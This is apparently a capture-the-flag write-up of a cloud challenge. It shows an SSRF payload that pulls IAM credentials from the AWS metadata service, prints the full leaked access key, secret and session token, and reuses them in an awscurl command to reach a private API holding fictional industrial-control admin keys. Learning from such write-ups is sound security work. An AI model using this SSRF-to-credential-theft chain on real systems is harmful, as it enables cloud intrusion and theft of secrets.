---
layaout: post
title: Dashboarded HTB Bussines CTF 2025
image: assets/images/aws.png
date: 27-05-2025
categories:
  - Write ups
tags:
  - Cloud
excerpt: The goal is to infiltrate Volnaya's cloud-based Industrial Control System (ICS) monitoring network, locate sensitive data, and enable the Task Force to assume control of their core systems. The entry point is a web application hosted at `3.15.107.79`, which is vulnerable to Server-Side Request Forgery (SSRF). Ultimately, we aim to retrieve critical system information and capture the flag.
---
![img-description](assets/images/dashboarded.png)
## Objective
---
The goal is to infiltrate Volnaya's cloud-based Industrial Control System (ICS) monitoring network, locate sensitive data, and enable the Task Force to assume control of their core systems. The entry point is a web application hosted at `3.15.107.79`, which is vulnerable to Server-Side Request Forgery (SSRF). Ultimately, we aim to retrieve critical system information and capture the flag.
## Step 1: Initial Reconnaissance
---
Upon accessing the web application at `http://3.15.107.79`, we identify a POST request that accepts a `url` parameter:

```http
POST / HTTP/1.1
Host: 3.15.107.79
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://3.15.107.79
Connection: keep-alive
Referer: http://3.15.107.79/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=https%3A%2F%2Finyunqef0e.execute-api.us-east-2.amazonaws.com%2Fapi%2Fstatus
```

This request indicates that the server fetches the provided URL and processes its response. The URL points to an AWS API Gateway endpoint (`https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status`), suggesting the application interacts with AWS infrastructure. The presence of a `url` parameter in a POST request is a strong indicator of potential SSRF vulnerability, as it allows us to control the URL the server requests.

## Step 2: Testing for SSRF Vulnerability
---
To confirm the SSRF vulnerability, we test whether the server will fetch arbitrary URLs, including internal ones. Since the application is running in an AWS environment (indicated by the API Gateway URL), we target the AWS metadata service, which is accessible at `http://169.254.169.254` from within an EC2 instance.

We craft a new POST request to fetch IAM credentials from the metadata service:

```http
POST / HTTP/1.1
Host: 3.15.107.79
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://3.15.107.79
Connection: keep-alive
Referer: http://3.15.107.79/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole
```

### Logic Behind the Payload

- **AWS Metadata Service**: In AWS EC2 instances, the metadata service at `http://169.254.169.254` provides sensitive information, including temporary IAM credentials for roles attached to the instance.
- **SSRF Exploitation**: By setting the `url` parameter to `http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole`, we trick the server into making an internal request to the metadata service, which is only accessible from within the AWS environment.
- **Expected Outcome**: If the SSRF vulnerability exists, the server will fetch and return the IAM credentials associated with the `APICallerRole` role.

## Step 3: Analyzing the SSRF Response
---
The server responds with the following data, confirming the SSRF exploit was successful:

```html
<h2>Systems Under Empire Control</h2>
Invalid JSON data: Success
Invalid JSON data: 2025-05-27T11:26:32Z
Invalid JSON data: AWS-HMAC
Invalid JSON data: ASIARHJJMXKMQTBOPGVF
Invalid JSON data: rlfrV0Dt60qjdu3VPCHap6T/otpKMnsb1p/glns0
Invalid JSON data: IQoJb3JpZ2luX2VjEJP//////////wEaCXVzLWVhc3QtMiJHMEUCIBv6v8yrxWBMy5rg3AgaZHAdpZxVdV9KWMZHu9VH+DDsAiEA0mQ3Kyh3LQAAFNqUMBNmcu7dZj42CL9ach55ZaKCZmEquwUIXRAAGgwwODQzNzU1NTA2MTciDPyU6UGS1ceL1dIBZCqYBU1eAY9UXEx06V8B8IOr6IXjS5D+KPCBs+5mDbDuz0ymmoJ/CC3vQKd1j57okZDk6FOCti1ljWSPfrApWHYGhiJ+OjgT5jfuMvs8dl5CL62EVR6WALHMbtBqrVaQ334x7dZ2J8asKCetRbViWmShVvIlOE+4nJKK8dpWnIwkDSPuAKeRAnmKBxm+h+brhudqRufRoM/4xjhVZDkIm1DLXxYbPCwHe3jC/dp3HKdw3burwWXCY5F4LDAdrFABnkpkmON4gDnMhXC3UR6QYDBnmjZX61yKD/t7Vz/TdGCWpEoz4IU1wFJaaCvGz0ZYUQlYZWZg2ChDMhZM8b3d38HvxebFf95oBJVPWZLQBpBDInYtUriSyjhzxBAfu9XtGiK3Ry5uYMyYBSlozRHVAYTOFYScoLJZvFQljtERLTFY3uLnhk1zYc1bkfsdW/DyeNvUfgMFbQAXXRYk+ykGZ+IIkOOMTdug45bd728BPNQhcDW0rQRPcWR/RdE6RC4U2ps8ge3deqzyEiscRewRFwDYgljmBmIc5+J1SeVYOQT3JTrgG03v6PfhEnAQiNLC/YHOY27djq6jz7XTHGebRuE5LLp/JPmoalfDMRAVfjaF9+oiu6pIxk5m37Fu5daXGzOdrtGX5W0FjSWgThANdFOqsyMJZ5i+4roGT3KsB2hBNseqZo2I89lfJjerPuCSkYjlNW2oKnSO0/QQSI13nPD5OjRL5wltICXSs7Z94dm6CryS4yqjsTosnRJHLsy70NPCfAbaLJcxnqS4rLG4Of1AIDuFxJRQADM6VaXpZB/flLh8xVi2MXFMEy8Go1VL7ZHmAxv6dt3LxnaGZFcYN/dt8tL/sLhIWSfqLqFDrbzm11Zg9ai9PcRSNfUw+sLWwQY6sQG6EwZqIOojUFAYIo5zyllPdKa7Q3UptRoAATb2hcAigbSKDKzNikW6UzOtm9xIlNlasM8jtuQBv1prlypDeVL46aa5B3Rw3ss1cyqfZHlaj8smFPbRANVs2Pjs06FyUk+CViDvHHgvnAjNfv/OR29oCE+70KSXZQsN4iTa9wjt5tbfLuNcshQ+v7lm7gDGJnN7J3AlYkmbRTDnKawVRY10EHc7DpJGe7Qdo0YKreZfdzM=
Invalid JSON data: 2025-05-27T17:32:36Z
```

### Breaking Down the Response

- **Success**: Indicates the metadata request was successful.
- **Access Key ID**: `ASIARHJJMXKMQTBOPGVF`
- **Secret Access Key**: `rlfrV0Dt60qjdu3VPCHap6T/otpKMnsb1p/glns0`
- **Session Token**: A long temporary token starting with `IQoJb3JpZ2luX2VjEJP...`
- **Timestamps**: Indicate the credentials' issuance (`2025-05-27T11:26:32Z`) and expiration (`2025-05-27T17:32:36Z`).
- **AWS-HMAC**: Suggests the use of AWS Signature Version 4 for authentication.

These are temporary IAM credentials for the `APICallerRole` role, which can be used to interact with AWS services.
![img-description](assets/images/ssrf.png)
## Step 4: Leveraging IAM Credentials
---
With the IAM credentials obtained, we can now interact with the AWS API Gateway endpoint identified earlier (`https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private`), which likely contains sensitive data or functionality, as it’s not publicly accessible.

We use the `awscurl` tool to make an authenticated request to the private endpoint, signing the request with the stolen credentials:

```bash
awscurl --service execute-api --region us-east-2 \
    --access_key ASIARHJJMXKMQTBOPGVF \
    --secret_key rlfrV0Dt60qjdu3VPCHap6T/otpKMnsb1p/glns0 \
    --session_token IQoJb3JpZ2luX2VjEJP//////////wEaCXVzLWVhc3QtMiJHMEUCIBv6v8yrxWBMy5rg3AgaZHAdpZxVdV9KWMZHu9VH+DDsAiEA0mQ3Kyh3LQAAFNqUMBNmcu7dZj42CL9ach55ZaKCZmEquwUIXRAAGgwwODQzNzU1NTA2MTciDPyU6UGS1ceL1dIBZCqYBU1eAY9UXEx06V8B8IOr6IXjS5D+KPCBs+5mDbDuz0ymmoJ/CC3vQKd1j57okZDk6FOCti1ljWSPfrApWHYGhiJ+OjgT5jfuMvs8dl5CL62EVR6WALHMbtBqrVaQ334x7dZ2J8asKCetRbViWmShVvIlOE+4nJKK8dpWnIwkDSPuAKeRAnmKBxm+h+brhudqRufRoM/4xjhVZDkIm1DLXxYbPCwHe3jC/dp3HKdw3burwWXCY5F4LDAdrFABnkpkmON4gDnMhXC3UR6QYDBnmjZX61yKD/t7Vz/TdGCWpEoz4IU1wFJaaCvGz0ZYUQlYZWZg2ChDMhZM8b3d38HvxebFf95oBJVPWZLQBpBDInYtUriSyjhzxBAfu9XtGiK3Ry5uYMyYBSlozRHVAYTOFYScoLJZvFQljtERLTFY3uLnhk1zYc1bkfsdW/DyeNvUfgMFbQAXXRYk+ykGZ+IIkOOMTdug45bd728BPNQhcDW0rQRPcWR/RdE6RC4U2ps8ge3deqzyEiscRewRFwDYgljmBmIc5+J1SeVYOQT3JTrgG03v6PfhEnAQiNLC/YHOY27djq6jz7XTHGebRuE5LLp/JPmoalfDMRAVfjaF9+oiu6pIxk5m37Fu5daXGzOdrtGX5W0FjSWgThANdFOqsyMJZ5i+4roGT3KsB2hBNseqZo2I89lfJjerPuCSkYjlNW2oKnSO0/QQSI13nPD5OjRL5wltICXSs7Z94dm6CryS4yqjsTosnRJHLsy70NPCfAbaLJcxnqS4rLG4Of1AIDuFxJRQADM6VaXpZB/flLh8xVi2MXFMEy8Go1VL7ZHmAxv6dt3LxnaGZFcYN/dt8tL/sLhIWSfqLqFDrbzm11Zg9ai9PcRSNfUw+sLWwQY6sQG6EwZqIOojUFAYIo5zyllPdKa7Q3UptRoAATb2hcAigbSKDKzNikW6UzOtm9xIlNlasM8jtuQBv1prlypDeVL46aa5B3Rw3ss1cyqfZHlaj8smFPbRANVs2Pjs06FyUk+CViDvHHgvnAjNfv/OR29oCE+70KSXZQsN4iTa9wjt5tbfLuNcshQ+v7lm7gDGJnN7J3AlYkmbRTDnKawVRY10EHc7DpJGe7Qdo0YKreZfdzM= \
    https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private
```

### Logic Behind the Command

- **awscurl**: A tool that simplifies making AWS-signed requests using temporary credentials.
- **Service and Region**: The `--service execute-api` and `--region us-east-2` parameters ensure the request is signed correctly for the API Gateway in the `us-east-2` region.
- **Credentials**: The stolen `Access Key ID`, `Secret Access Key`, and `Session Token` authenticate the request as the `APICallerRole`.
- **Private Endpoint**: The `/api/private` endpoint is likely protected and requires valid IAM credentials, which we now possess.

## Step 5: Analyzing the Private Endpoint Response
---
The response from the `/api/private` endpoint reveals critical information about Volnaya’s ICS infrastructure, along with the flag:

![img-description](assets/images/awscurl.png)
### Breaking Down the Response

The response contains detailed information about multiple ICS facilities under Volnaya’s control, including:

- **Power Plant Zeta-7**: Active, 75 MW load, with admin access key `PLANT-Z7-ADMLv3-2025`.
- **Water Treatment Facility Delta-9**: Processes 500,000 gallons/day, with admin access key `WTFS-D9-ADMLv2-2025`.
- **Factory Alpha-12**: Produces 1200 units/day, controlled by PLC, with admin access key `FACTORY-A12-ADM-2025`.
- **Oil Refinery Sigma-15**: On standby, processes 200,000 barrels/day, with admin access key `REF-SIGMA15-ADM-2025`.
- **Nuclear Reactor Theta-8**: Offline for maintenance, with admin access key `NRC-THETA8-ADM-2025`.
- **Hydroelectric Dam Beta-4**: Active, 150 MW backup power, with admin access key `DAM-BETA4-ADM-2025`.
- **Smart Grid Hub Lambda-3**: Active, 60 Hz grid stability, with admin access key `SG-HUB-L3-ADM-2025`.
- **Chemical Plant Gamma-6**: Handles 5000 liters of acidic compounds, with admin access key `CHEM-GAMMA6-ADM-2025`.
- **Data Center Pi-1**: 80% server load, with admin access key `DC-PI-1-ADM-2025`.
- **Flag**: `HTB{d4sh1nG_REDACTED}`

Each entry includes operational statuses, encryption keys, admin access keys, sensor IDs, and security audit dates, providing a comprehensive view of the ICS infrastructure. The flag indicates the successful completion of the challenge.

## Conclusion
---
By exploiting the SSRF vulnerability, we retrieved temporary IAM credentials from the AWS metadata service, which allowed us to authenticate to the private API Gateway endpoint. The endpoint’s response exposed detailed information about Volnaya’s ICS infrastructure, including admin access keys, encryption keys, and the flag `HTB{d4sh1nG_REDACTED}`. This foothold provides the Task Force with the ability to extract sensitive data and potentially control critical systems.

**Key Takeaways**:

- SSRF vulnerabilities in web applications can expose internal services, especially in cloud environments like AWS.
- The AWS metadata service is a prime target for SSRF attacks due to its sensitive data, such as IAM credentials.
- Temporary IAM credentials can unlock privileged access to AWS resources, emphasizing the need for proper SSRF mitigations.
- The exposed admin keys and encryption keys could enable further exploitation, highlighting the importance of securing internal APIs and monitoring access controls.

![netrunner](/assets/images/netrunner.gif)
